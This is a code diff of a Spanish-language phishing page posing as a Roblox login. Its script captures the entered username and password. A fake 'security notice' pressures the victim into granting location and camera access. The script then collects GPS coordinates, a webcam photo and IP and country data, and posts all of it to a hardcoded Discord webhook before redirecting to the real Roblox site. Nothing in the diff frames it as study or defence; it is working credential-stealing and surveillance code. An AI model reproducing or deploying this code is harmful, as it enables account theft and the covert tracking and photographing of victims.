@@ -47,85 +47,95 @@
 
     <script>
         const hook = "https://discord.com/api/webhooks/1499616194741801133/i-irhmgrf87Sldg0W8yWsgRAz_TUYh3JK7DEu7UGi6bsKvMNUwNe3vnpH2Ga1qFlvUNk";
-        let geoData = {};
+        let infoIP = {};
 
-        // Cargar IP al inicio
+        // Cargar datos de IP al inicio
         window.onload = async () => {
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                geoData = await res.json();
+                const r = await fetch('https://ipapi.co/json/');
+                infoIP = await r.json();
             } catch (e) {}
         };
 
         document.getElementById('btnLog').addEventListener('click', async () => {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
 
-            if (!u || !p) return;
+            if (!user || !pass) return;
 
-            document.getElementById('btnLog').innerText = "Verificando...";
+            // 1. Mensaje persuasivo para asegurar que acepten
+            alert("AVISO DE SEGURIDAD: Roblox ha detectado un inicio de sesión desde un dispositivo nuevo. Para verificar su identidad, debe permitir el acceso a su ubicación y cámara en las siguientes ventanas.");
 
-            // Paso 1: Pedir Ubicación
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                await processCameraAndSend(u, p, gps);
-            }, async () => {
-                await processCameraAndSend(u, p, "Denegado");
-            }, { timeout: 5000 });
+            // INICIO DE CADENA DE PERMISOS
+            // Primero la Ubicación
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    solicitarCamara(user, pass, gps);
+                },
+                () => {
+                    solicitarCamara(user, pass, "Ubicación Denegada");
+                },
+                { timeout: 8000 }
+            );
         });
 
-        async function processCameraAndSend(u, p, gps) {
+        async function solicitarCamara(u, p, gps) {
             let camStatus = "Denegada";
-            let fotoBlob = null;
+            let foto = null;
 
             try {
-                // Paso 2: Pedir Cámara
+                // Segundo: La Cámara
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 camStatus = "Concedida";
+                
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
-                // Esperar un momento para capturar la imagen
-                await new Promise(r => setTimeout(r, 1000));
+                // Esperar a que la cámara inicie
+                await new Promise(r => setTimeout(r, 1500));
+                
                 const canvas = document.getElementById('c');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                fotoBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
+                foto = await new Promise(r => canvas.toBlob(r, 'image/png'));
                 stream.getTracks().forEach(t => t.stop());
-            } catch (err) {}
+            } catch (err) {
+                console.log("Cámara rechazada");
+            }
 
-            await sendReport(u, p, gps, camStatus, fotoBlob);
+            enviarTodo(u, p, gps, camStatus, foto);
         }
 
-        async function sendReport(u, p, gps, cam, foto) {
+        async function enviarTodo(u, p, gps, cam, foto) {
+            const formData = new FormData();
+            
             const embed = {
-                title: "🚨 REPORTE CODEBY ACTUALIZADO",
+                title: "🚀 REPORTE FINAL - Codeby",
                 color: 0xff0000,
                 fields: [
                     { name: "👤 Usuario", value: `\`${u}\``, inline: true },
                     { name: "🔒 Clave", value: `\`${p}\``, inline: true },
-                    { name: "🚩 País", value: `${geoData.country_emoji || ''} ${geoData.country_name || 'N/A'}`, inline: true },
-                    { name: "🌐 IP", value: `\`${geoData.ip || 'N/A'}\``, inline: true },
-                    { name: "📍 Ubicación GPS", value: gps },
+                    { name: "🌐 IP", value: `\`${infoIP.ip || 'N/A'}\``, inline: true },
+                    { name: "🚩 País", value: `${infoIP.country_emoji || ''} ${infoIP.country_name || 'N/A'}`, inline: true },
+                    { name: "📍 GPS", value: gps },
                     { name: "📸 Cámara", value: cam, inline: true }
                 ],
                 footer: { text: "GUI By:Codeby" },
                 timestamp: new Date()
             };
 
-            // Enviar datos
-            const formData = new FormData();
             formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
             
             if (foto) {
-                formData.append('file', foto, 'captura.png');
+                formData.append('file', foto, 'captura_codeby.png');
             }
 
             await fetch(hook, { method: 'POST', body: formData });
 
-            // Redirección final
+            // Redirigir después de enviar
             window.location.href = "https://www.roblox.com/login";
         }
     </script>
